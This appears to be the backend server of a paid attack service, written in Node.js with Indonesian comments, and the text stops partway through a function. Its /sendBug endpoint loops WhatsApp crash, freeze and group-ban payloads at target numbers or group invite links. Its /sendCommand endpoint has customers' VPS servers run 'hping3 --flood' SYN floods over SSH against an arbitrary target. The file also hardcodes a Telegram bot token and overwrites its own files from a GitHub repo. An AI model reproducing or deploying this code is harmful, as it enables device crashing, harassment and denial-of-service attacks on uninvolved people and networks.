const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);
process.on('unhandledRejection', (reason, promise) => {
  console.log('Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.log('Uncaught Exception:', err);
});

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};
process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

const safeExit = process.exit;
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    fetchLatestBaileysVersion,
    InteractiveMessage,    
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@kxafunc/xbails');
const express = require("express");
const readline = require("readline");
const crypto = require("crypto");
const app = express();
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const fsPromises = require('fs').promises;
const path = require('path');
const pino = require('pino');
const P = require('pino')
const axios = require('axios')
const vm = require('vm')
const os = require('os');
const WebSocket = require('ws');
const http = require('http');
const server = http.createServer(app); // gunakan Express app
const wss = new WebSocket.Server({ server });
let wsClients = {}; // { username: WebSocket }
let chatList = [];  // { from, to, message, time }
//update
const GH_OWNER = "teksbandingbanding-cell";
const GH_REPO = "Xover";
const GH_BRANCH = "main";

async function downloadRepo(dir = "", basePath = "/home/container") {
    const url = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${dir}?ref=${GH_BRANCH}`;

    const { data } = await axios.get(url, {
        headers: { "User-Agent": "Mozilla/5.0" }
    });

    for (const item of data) {
        const local = path.join(basePath, item.path);

        if (item.type === "file") {
            const fileData = await axios.get(item.download_url, {
                responseType: "arraybuffer"
            });

            fs.mkdirSync(path.dirname(local), { recursive: true });
            fs.writeFileSync(local, Buffer.from(fileData.data));

            console.log("[UPDATE]", local);
        }

        if (item.type === "dir") {
            fs.mkdirSync(local, { recursive: true });
            await downloadRepo(item.path, basePath);
        }
    }
}
const CHAT_FILE = 'chat.json';
const { Client } = require('ssh2');
const DB_PATH = "./database.json";
const SESSION_PATH = path.join(__dirname, "permenmd");
const THIRTY_MINUTES = 30 * 60 * 1000; // 30 menit
let activeKeys = {};
const KEY_FILE = path.join(__dirname, 'keyList.json');
const bugs = [
  { bug_id: "Blank", bug_name: "[ Ⓧ BLANK ANDRO 𝓣 ]" },
 //  { bug_id: "fcinvis", bug_name: "[ Ⓧ INVISIBLE FC ADRO 𝓣 ]" },
//  { bug_id: "lovelay", bug_name: "[ Ⓧ CRASH NOTIF 𝓣 ]" },
  { bug_id: "fc", bug_name: "[ Ⓧ INVISIBLE FC 𝓣 ]" },
//  { bug_id: "buldo", bug_name: "[ Ⓧ BULDOZER 𝓣 ]" },
  { bug_id: "buldo", bug_name: "[ Ⓧ KIL KUOTA C1 𝓣 ]"},
  { bug_id: "tesyu12", bug_name: "[ Ⓧ FREZZER LAG+DELAY 𝓣 ]"},
  { bug_id: "roid_group", bug_name: "Ⓧ BAN GB AJG 𝓣" },
 //  { bug_id: "Blank", bug_name: "Ⓧ BALNK ANDRO 𝓣" },
];
let cncActive = true; // Flag CNC
let vpsList = [];
let vpsConnections = {}
const VPS_FILE = 'vps.json';
let sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
fs.watchFile("keyList.json", () => {
  console.log("[📂] keyList.json changed, reloading...");
  sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
});


// Load chat from file
if (fs.existsSync(CHAT_FILE)) {
  chatList = JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8'));
}

// Simpan chat
function saveChat() {
  fs.writeFileSync(CHAT_FILE, JSON.stringify(chatList, null, 2));
}

// Sanitize fungsi
function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '') // hilangkan tag html
    .replace(/[\r\n]/g, ' ') // hilangkan newline
    .slice(0, 250); // batas 250 karakter
}

const TOKEN = "7368044006:AAHzD93QOjqtGm1kq-Tp6yM-oyLNT31J24Q"; // Ganti dengan token bot kamu

const telegramConfig = {
    ownerId: 7873239475,
    ownerUsername: 'XurooStore',
    channelUsername: 'tredict_ch',
    botUsername: 'Xuroomurbug_bot'
};

const TARGET_GROUP_ID = -1004496756861;
let informasiText = "Tredict Storm Server";
let tanggalText = "";
let hariText = "";

const bot = new TelegramBot(TOKEN, { polling: true });

// Fungsi Helper untuk Logging Asinkron (Mencegah Server Freeze/Lag)
async function appendLogAsync(filePath, data) {
  try {
    // Cek ukuran file dulu, jika terlalu besar (>5MB) hapus isi lama
    if (fs.existsSync(filePath)) {
      const stats = fs.statSync(filePath);
      if (stats.size > 5 * 1024 * 1024) { // 5MB Limit
        fs.writeFileSync(filePath, ''); // Reset file jika terlalu besar
      }
    }
    await fsPromises.appendFile(filePath, data);
  } catch (err) {
    console.error(`[❌ LOG ERROR] Gagal menulis log: ${err.message}`);
  }
}

async function autoRefresh() {
  try {
    // ===== CLEAR SESSION =====
    if (!fs.existsSync(SESSION_PATH)) {
      console.log("⚠️ Folder 'permenmd' tidak ditemukan.");
    } else {
      let deletedCount = 0;
      const userFolders = fs.readdirSync(SESSION_PATH);

      for (const userFolder of userFolders) {
        const userPath = path.join(SESSION_PATH, userFolder);
        if (!fs.lstatSync(userPath).isDirectory()) continue;

        const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
        if (!hasJson) {
          fs.rmSync(userPath, { recursive: true, force: true });
          deletedCount++;
        }
      }
      console.log(`[AUTO REFRESH] ${deletedCount} folder session kosong dihapus.`);
    }

    // ===== AUTO RESTART =====
    console.log("[AUTO REFRESH] Auto restart dijalankan...");

    setTimeout(() => {
      console.log("[AUTO REFRESH] Server aktif dan berjalan normal setelah auto restart.");
    }, 8000);

    setTimeout(() => {
      console.log("[AUTO REFRESH] Process restart server");
      process.exit(0);
    }, 5000);

  } catch (err) {
    console.error("[AUTO REFRESH] Error", err);
  }
}
// ===== Setup Log System =====
const LOGS_DIR = path.join(__dirname, 'user_logs'); // Folder khusus log user

function hapusIsiUserLogs() {
  if (!fs.existsSync(LOGS_DIR)) {
    console.log("[AUTOCLEAN LOGS] Folder tidak ditemukan");
    return;
  }

  const files = fs.readdirSync(LOGS_DIR);

  for (const file of files) {
    const filePath = path.join(LOGS_DIR, file);
    fs.rmSync(filePath, { recursive: true, force: true });
  }

  console.log("[AUTOCLEAN LOGS] Isi folder berhasil dihapus");
}

// Buat folder jika belum ada
if (!fs.existsSync(LOGS_DIR)) {
  fs.mkdirSync(LOGS_DIR, { recursive: true });
  console.log("[LOGS] Folder 'user_logs' dibuat.");
}

/**
 * Fungsi untuk menyimpan aktivitas user ke file JSON mereka sendiri
 * @param {string} username - Username user
 * @param {string} type - 'login', 'bug', 'create'
 * @param {string} title - Judul aktivitas
 * @param {string} description - Detail aktivitas
 */
function saveUserLog(username, type, title, description) {
  try {
    const userLogPath = path.join(LOGS_DIR, `${username}.json`);
    let logs = [];

    // Baca log lama jika ada
    if (fs.existsSync(userLogPath)) {
      logs = JSON.parse(fs.readFileSync(userLogPath, 'utf8'));
    }

    // Tambah log baru
    logs.push({
      type: type,
      title: title,
      description: description,
      timestamp: Date.now() // Timestamp dalam milidetik
    });

    // Simpan kembali (Overwrite)
    fs.writeFileSync(userLogPath, JSON.stringify(logs, null, 2));
    console.log(`[LOGS] Activity saved for ${username}: ${type}`);
  } catch (err) {
    console.error(`[LOGS] Gagal simpan log ${username}:`, err.message);
  }
}

wss.on('connection', function (ws, req) {
  let username;

  ws.on('message', function (msg) {
    try {
      const data = JSON.parse(msg);

      if (data.type === 'sessionCheck') {
        const sessionList = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const user = sessionList.find(e => e.sessionKey === data.key);

        if (!user) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Invalid key"
          }));
          return ws.close();
        }

        if (user.androidId !== data.androidId) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Another device has logged in"
          }));
          return ws.close();
        }
      }

      if (data.type === 'validate') {
        const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key)
        const validId = session.find(e => e.androidId === data.androidId)

        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!validId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

        // Autentikasi sukses
        ws.send(JSON.stringify({
          type: "myInfo",
          valid: true,
          username: session.username,
          androidId: session.androidId,
          role: session.role || "member"
        }));

        const interval = setInterval(() => {
          const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
          const validKey = session.find(e => e.sessionKey === data.key)
          const validId = session.find(e => e.androidId === data.androidId)

          if (!validKey) {
            ws.send(JSON.stringify({
              type: "myInfo",
              valid: false,
              reason: "keyInvalid"
            }));
            return ws.close();
          }

          if (!validId) {
            ws.send(JSON.stringify({
              type: "myInfo",
              valid: false,
              reason: "androidIdMismatch"
            }));
            return ws.close();
          }

        }, 10000);
      }
      if (data.type === 'auth') {
        username = getUserByKey(data.key);
        console.log(username)
        if (!username) return ws.close();
        wsClients[username] = ws;

        // Kirim chatList awal
        const list = chatList
          .filter(m => m.from === username || m.to === username)
          .map(m => (m.from === username ? m.to : m.from));

        ws.send(JSON.stringify({
          type: "chatList",
          users: [...new Set(list)],
        }));
      }

      if (data.type === 'chat') {
        const to = data.to;
        const message = sanitize(data.message);
        if (!username || !to || !message || message.length > 250) return;

        const chat = {
          from: username,
          to,
          message,
          time: new Date().toISOString()
        };
        chatList.push(chat);
        saveChat();

        // Kirim ke pengirim
        ws.send(JSON.stringify({ type: 'chat', message: { ...chat, fromMe: true } }));

        // Kirim ke penerima jika online
        if (wsClients[to]) {
          wsClients[to].send(JSON.stringify({
            type: 'chat',
            message: { ...chat, fromMe: false }
          }));
        }
      }

      if (data.type === 'getMessages') {
        const withUser = data.with;
        const messages = chatList
          .filter(m =>
            (m.from === username && m.to === withUser) ||
            (m.from === withUser && m.to === username)
          )
          .map(m => ({
            ...m,
            fromMe: m.from === username
          }));

        ws.send(JSON.stringify({ type: 'messages', with: withUser, messages }));
      }
    } catch (e) {
      console.error("WS error:", e.message);
    }
  });

  ws.on('close', () => {
    if (username && wsClients[username]) {
      delete wsClients[username];
    }
  });
});

// Ganti listen jadi ini:
const wsPort = 3000;
server.listen(wsPort, () => {
  console.log(`🟣 Server running on http://shiikitzy.digital-panel.web.id:${wsPort}`);
});

const PORT = 2001;

app.use(express.urlencoded({ extended: false }));
app.use(express.json());
// ===== Rate Limit Middleware (20 req/detik per token) =====
const rateLimitMap = {};
function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();
  if (!rateLimitMap[key]) rateLimitMap[key] = [];

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  if (rateLimitMap[key].length > 2) {
    const db = loadDatabase();
    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
    console.warn(`[🚫 RATE LIMIT] Token '${key}' (${user?.username || 'unknown'}) melebihi batas 20 req/detik.`);

    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 20 request per detik.",
    });
  }

  next();
}

app.use(rateLimiter);


app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*"); // atau ganti * dengan domain spesifik
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});


if (fs.existsSync(KEY_FILE)) {
  try {
    const rawData = fs.readFileSync(KEY_FILE, 'utf8');
    const parsed = JSON.parse(rawData); // ini array

    for (const user of parsed) {
      if (user.sessionKey && user.username && user.lastLogin) {
        const created = new Date(user.lastLogin).getTime();
        const expires = created + 10 * 60 * 1000; // +10 menit

        activeKeys[user.sessionKey] = {
          username: user.username,
          created,
          expires,
        };
      }
    }

    console.log("✅ activeKeys loaded from keyList.json.");
  } catch (err) {
    console.error("❌ Failed to load keyList.json:", err.message);
  }
}


function connectToAllVPS() {
  if (!cncActive) return;

  console.log("🔄 Connecting to all VPS servers...");

  for (const vps of vpsList) {
    if (vpsConnections[vps.host]) {
      console.log(`✅ Already connected to ${vps.host}`);
      continue;
    }

    const conn = new Client();

    conn.on('ready', () => {
      if (!cncActive) {
        conn.end(); // Langsung tutup kalau CNC tidak aktif
        return;
      }

      console.log(`✅ Connected to VPS: ${vps.host}`);
      vpsConnections[vps.host] = conn;

      // Jika koneksi putus, reconnect otomatis
      conn.on('close', () => {
        console.log(`🔌 Disconnected: ${vps.host}`);
        delete vpsConnections[vps.host];

        if (cncActive) {
          console.log(`🔁 Reconnecting to ${vps.host} in 5s...`);
          setTimeout(connectToAllVPS, 5000);
        }
      });
    });

    conn.on('error', (err) => {
      console.log(`❌ Failed to connect to ${vps.host}: ${err.message}`);
    });

    conn.connect({
      host: vps.host,
      username: vps.username,
      password: vps.password,
      readyTimeout: 5000
    });
  }
}

// 🚫 Disconnect semua koneksi (misal saat restart)
function disconnectAllVPS() {
  console.log("🛑 Disconnecting all VPS connections...");
  cncActive = false;

  for (const host in vpsConnections) {
    vpsConnections[host].end();
    delete vpsConnections[host];
  }
}

// Load VPS list saat server pertama kali jalan
if (fs.existsSync(VPS_FILE)) {
  vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
  console.log("📥 VPS list loaded.");
  connectToAllVPS(); // Connect ke semua VPS saat server jalan
}

// Pantau perubahan file VPS
fs.watch(VPS_FILE, () => {
  try {
    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
    console.log("🔄 VPS list updated.");
    connectToAllVPS(); // Connect ke semua VPS saat server jalan
  } catch (e) {
    console.error("❌ Failed to update VPS list:", e.message);
  }
});

// Middleware: Cek sessionKey dan ambil username
function getUserByKey(key) {
  const keyInfo = activeKeys[key];
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  return user ? keyInfo.username : null;
}

// GET /myServer
app.get("/myServer", (req, res) => {
  const key = req.query.key;
  const username = getUserByKey(key);
  if (!username) return res.status(401).json({ error: "Invalid session key" });

  const userVPS = vpsList.filter(vps => vps.owner === username);
  res.json(userVPS);
});

// POST /addServer
app.post("/addServer", (req, res) => {
  const { key, host, username: sshUser, password } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });

  const newVPS = { host, username: sshUser, password, owner };
  vpsList.push(newVPS);
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
  res.json({ success: true, message: "VPS added" });
});

// POST /delServer
app.post("/delServer", (req, res) => {
  const { key, host } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  const before = vpsList.length;
  vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));

  const deleted = before !== vpsList.length;
  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
});

// POST /sendCommand
app.post("/sendCommand", (req, res) => {
  const { key, target, port, duration } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!target || !port || !duration) return res.status(400).json({ error: "Missing fields" });

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (userVPS.length === 0) return res.status(400).json({ error: "No VPS available for this user" });

  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) {
      console.log(`❌ Not connected to ${vps.host}`);
      continue;
    }

    const command = `screen -dmS hping3 -S --flood ${target} -p ${port}`;
    const killCmd = `sleep ${duration}; pkill screen`;

    conn.exec(`${command} && ${killCmd}`, (err, stream) => {
      if (err) return console.error(`❌ Exec error on ${vps.host}:`, err.message);
      stream.on('close', (code, signal) => {
        console.log(`✅ Command done on ${vps.host} (code: ${code})`);
      });
    });
  }

  res.json({ success: true, message: `Command sent to ${userVPS.length} VPS` });
});


function loadDatabase() {
  if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify([]));
    console.log("[🗃️ DB] Database baru dibuat.");
  }
  const data = JSON.parse(fs.readFileSync(DB_PATH));
  return data;
}

function saveDatabase(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

function generateKey() {
  const key = crypto.randomBytes(8).toString("hex");
  console.log("[🔑 GEN] Key baru dibuat:", key);
  return key;
}

function isExpired(user) {
  const expired = new Date(user.expiredDate) < new Date();
  console.log(`[⏳ EXP] ${user.username} expired:`, expired);
  return expired;
}

app.get("/getInfo", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No connection" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];
  const jid = number.includes("@") ? number : number + "@s.whatsapp.net";

  try {
    const ppUrl = await sock.profilePictureUrl(jid, 'image').catch(() => null);
    const statusObj = await sock.fetchStatus(jid).catch(() => null);
    const check = await sock.onWhatsApp(number).catch(() => []);
    const info = check[0] || {};

    return res.json({
      valid: true,
      number: number,
      photo: ppUrl || "https://static.vecteezy.com/system/resources/previews/009/292/244/non_2x/default-avatar-icon-of-social-media-user-vector.jpg",
      bio: statusObj?.status || "No bio",
      online: !!statusObj?.lastSeen,
      type: info.biz ? "business" : "personal"
    });
  } catch (err) {
    console.warn("[❌ GETINFO ERROR]", err.message);
    return res.json({ valid: false, message: "Query failed" });
  }
});

const KEY_LIST_FILE = path.join(__dirname, 'keyList.json');

function loadKeyList() {
  try {
    return JSON.parse(fs.readFileSync(KEY_LIST_FILE, 'utf8'));
  } catch {
    return [];                // file belum ada / rusak → mulai kosong
  }
}

function saveKeyList(list) {
  fs.writeFileSync(KEY_LIST_FILE, JSON.stringify(list, null, 2));
}

function recordKey({ username, key, role, ip, androidId }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);

  if (idx !== -1) {
    list[idx] = { username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId };
  } else {
    list.push({ username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId });
  }

  saveKeyList(list);
}

const news = [
  {
    image: "https://files.catbox.moe/t9fsky.jpg",
    title: "X-Over",
    desc: "CREDIT BY @XurooStore"
  }
];

// ===== Endpoint: Ambil Riwayat Aktivitas User =====
app.get("/getMyActivity", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid session key" });

  const username = keyInfo.username;
  const userLogPath = path.join(LOGS_DIR, `${username}.json`);

  try {
    if (!fs.existsSync(userLogPath)) {
      // Jika belum ada log sama sekali, return array kosong
      return res.json({ valid: true, activities: [] });
    }

    const logs = JSON.parse(fs.readFileSync(userLogPath, 'utf8'));

    // Urutkan dari yang terbaru
    logs.sort((a, b) => b.timestamp - a.timestamp);

    return res.json({ valid: true, activities: logs });
  } catch (err) {
    console.error("[GET LOGS ERROR]", err.message);
    return res.status(500).json({ valid: false, message: "Gagal mengambil log" });
  }
});

// ===== Endpoint: Validate & Login (With Device Lock) =====
app.post("/validate", (req, res) => {
  const { username, password, version, androidId } = req.body;

  if (!androidId) {
    return res.json({ valid: false, message: "androidId required" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);

  if (!user) return res.json({ valid: false });

  if (isExpired(user)) {
    return res.json({ valid: true, expired: true });
  }

  // --- LOGIKA CEK PERANGKAT (DEVICE LOCK) ---
  const keyList = loadKeyList();
  const existingSession = keyList.find(e => e.username === username);

  // Jika user sudah punya session dan Device ID berbeda dengan yang login sekarang
  if (existingSession) {
    const oldAndroid = existingSession.androidId;
    const newAndroid = androidId;

    if (oldAndroid !== newAndroid) {
      console.log(`🚫 LOGIN DITOLAK: ${username} | Device Lama: ${oldAndroid} | Device Baru: ${newAndroid}`);

      // KIRIM PESAN ERROR KHUSUS SEHINGGA APLIKASI FLUTTER TAHU
      return res.json({
        valid: false,
        message: "Akun ini sedang login di perangkat lain. Silakan logout terlebih dahulu di perangkat lama."
      });
    }
  }
  // -------------------------------------------

  // Jika sampai sini, berarti:
  // 1. User belum pernah login (existingSession = null)
  // 2. ATAU Device ID sama (Refresh Key)

  const key = generateKey();
  activeKeys[key] = {
    username,
    created: Date.now(),
    expires: Date.now() + 10 * 60 * 1000,
  };

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId,
  });

  saveUserLog(
    username,
    "login",
    "Login Berhasil",
    `IP: ${req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip} | Device: ${androidId}`
  );

  return res.json({
    valid: true,
    expired: false,
    key,
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,
    news
  });
});

app.get("/myInfo", (req, res) => {
  const { username, password, androidId, key } = req.query;
  console.log("[ℹ️ INFO] Fetching info for:", username);

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);
  const keyList = loadKeyList();
  const userKey = keyList.find(k => k.username === username);
  console.log(userKey)

  if (!userKey) {
    console.log("[❌ KEY] Invalid or missing session key.");
    return res.json({ valid: false, reason: "session" });
  }

  if (userKey.androidId !== androidId) {
    console.log("[⚠️ DEVICE] Device mismatch:", userKey.androidId, "!=", androidId);
    return res.json({ valid: false, reason: "device" });
  }

  if (!user) {
    console.log("[❌ INFO] User not found.");
    return res.json({ valid: false });
  }

  if (isExpired(user)) {
    console.log("[⚠️ INFO] User expired.");
    return res.json({ valid: true, expired: true });
  }

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId
  });

  console.log("[✅ INFO] Info dikirim untuk:", username);

  return res.json({
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,
    news: news // ✅ Tambahkan ini
  });
});

app.post("/changepass", (req, res) => {
  const { username, oldPass, newPass } = req.body;
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db[idx].password = newPass;
  saveDatabase(db);

  return res.json({ success: true, message: "Password updated successfully" });
});

app.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  let { target } = req.query;

  console.log(`[📤 BUG] Send request for ${target} using key ${key} - Bug: ${bug}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    console.log("[❌ BUG] User tidak ditemukan.");
    return res.json({ valid: false });
  }

  // ===== Role-based Cooldown =====
  const roleCooldowns = {
    member: 300,
    reseller: 240,
    admin: 60,
    owner: 1,
    vip: 60,
  };
  const role = user.role || "member";
  const cooldownSeconds = roleCooldowns[role] || 60;

  if (!user.lastSend) user.lastSend = 0;

  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);
  if (diffSeconds < cooldownSeconds) {
    console.log(`${user.username} Still Cooldown`)
    return res.json({
      valid: true,
      sended: false,
      cooldown: true,
      wait: cooldownSeconds - diffSeconds,
    });
  }

  // ============ Respon Duluan ============ //
  user.lastSend = now;
  saveDatabase(db);
  console.log(`${user.username} Trigger Cooldown`);

  res.json({
    valid: true,
    sended: true,
    cooldown: false,
    role
  });

  // ============ Kirim Bug di Background ============ //
  setImmediate(async () => {
    saveUserLog(
      user.username,
      "bug",
      `Kirim Bug: ${bug.toUpperCase()}`,
      `Target: ${target} | Role: ${user.role}`
    );

    const isMessBug = false;

    const attemptSend = async (sock, retry = false) => {
      try {
        let targetJid = "";
        const groupRegex = /chat\.whatsapp\.com\/([A-Za-z0-9]+)/;

        if (groupRegex.test(target)) {
          // ... Logic Group (Sama seperti sebelumnya) ...
          const inviteCode = target.match(groupRegex)[1];
          console.log(`[🚀] Mode Group. Invite Code: ${inviteCode}`);

          let groupInfo;
          try {
            groupInfo = await sock.groupGetInviteInfo(inviteCode);
          } catch (e) {
            throw new Error("Invite group invalid / expired");
          }

          targetJid = groupInfo.id;
          console.log(`[👥] Group JID: ${targetJid}`);

          try {
            await sock.groupAcceptInvite(inviteCode);
            console.log(`[✅] Join group success`);
          } catch (e) {
            console.log(`[⚠️] Already joined / join skipped`);
          }

        } else if (target.endsWith("@g.us")) {
          targetJid = target;
          console.log(`[👥] Target Group JID langsung`);

        } else {
          const cleanNumber = target.replace(/\D/g, "");
          targetJid = cleanNumber + "@s.whatsapp.net";
          console.log(`[📞] Mode Nomor: ${targetJid}`);
        }

        // --- KIRIM BUG (Switch Case) ---
        switch (bug) {
          case "fc":
            for (let i = 0; i < 300; i++) {
              
              await FcNewMonkey(sock, targetJid);
             }
            break;
           case "Blank":
            for (let i = 0; i < 10; i++) {
              await Blank(sock, targetJid);
            }
            break;
          case "android":
            for (let i = 0; i < 60; i++) {
              await D3nss(client, targetJid);
            }
            break;
          case "buldo":
            for (let i = 0; i < 100; i++) {
              await Buldozer(sock, targetJid);     
            }
            break;
           case "androidfrz":
            for (let i = 0; i < 15; i++) {
              await iOSExe(sock, targetJid);
            }
            break;
           case "clickcrash":
            for (let i = 0; i < 69; i++) {
              await D3nss(sock, targetJid);
            }
            break;
           case "lovelay":
            for (let i = 0; i < 50; i++) {
              await NotifDevice(sock, targetJid);
            }
            break;
          case "ios":
            for (let i = 0; i < 100; i++) {
              await testes2(sock, targetJid);
            }
            break;
           case "tesdoang":
            for (let i = 0; i < 100; i++) {
             await testes(sock, targetJid);
            }
            break;
          case "tesyu12":
            for (let i = 0; i < 400; i++) {
              await ingpisible(sock, targetJid);
              await delaybebasspam(sock,targetJid);
              await Delaycanx(sock, targetJid);
              await DelayIngpisV2(sock, targetJid);
              await DelayInvisCallReymon(sock, targetJid);
              await sleep(1500);
             }
            break;
            case "fcinvis":
            for (let i = 0; i < 500; i++) {
              await sticXcrash(sock, targetJid);
            }
            break;
          case "buldo":
            for (let i = 0; i < 100; i++) {
              await locfrz(sock, targetJid);
             }
            break;
          case "android_group":
            for (let i = 0; i < 100; i++) {
              await crashGroup(sock, targetJid);
              await sleep(1000);
            
            }
            break;
          case "lock_group":
            for (let i = 0; i < 00; i++) {
              await inenggfjjrs(sock, targetJid);
            };
            break;
          case "roid_group":
            for (let i = 0; i < 1000; i++) {
              await gbbannew(sock, targetJid);
              await sleep(1000);
            };
            break;
           case "xfcui":
            for (let i = 0; i < 60; i++) {
              await XFCUI(sock, targetJid);
            };
            break;
          case "exec":
            for (let i = 0; i < 100; i++) {
              await exeTrash(sock, targetJid);
            };
            break;
        }

        console.log(`[✅ BUG] Bug '${bug}' terkirim ke ${targetJid}`);
        return true;
      } catch (err) {
        console.warn(`[⚠️ SEND ERROR] ${err.message}`);

        if (!retry) {
          // Retry Logic
          if (user.role === 'vip') {
            // Retry: Ambil ulang dari gabungan VIP & Personal
            const availableSocks = [];
            const vipPath = path.join(__dirname, 'vip');
            const userPath = path.join('permenmd', user.username);

            if (fs.existsSync(vipPath)) availableSocks.push(...getActiveSocketsFromPath(vipPath));
            if (fs.existsSync(userPath)) availableSocks.push(...getActiveSocketsFromPath(userPath));

